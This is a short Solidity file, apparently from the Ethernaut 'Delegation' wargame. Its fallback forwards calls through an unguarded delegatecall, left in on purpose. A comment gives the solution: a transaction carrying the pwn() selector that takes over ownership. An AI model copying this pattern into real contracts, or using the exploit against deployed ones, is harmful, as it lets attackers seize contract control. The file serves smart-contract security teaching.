// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Solution:
// Make a call with data of the function you want to call through Delegation to trigger fallback function.
// bytes4(keccak256("pwn()")) = 0xdd365b8b
// contract.sendTransactions({data:"0xdd365b8b"})

contract Delegate {
    address public owner;

    constructor(address _owner) {
        owner = _owner;
    }

    function pwn() public {
        owner = msg.sender;
    }
}

contract Delegation {
    address public owner;
    Delegate delegate;

    constructor(address _delegateAddress) {
        delegate = Delegate(_delegateAddress);
        owner = msg.sender;
    }

    fallback() external {
        (bool result,) = address(delegate).delegatecall(msg.data);
        if (result) {
            this;
        }
    }
}
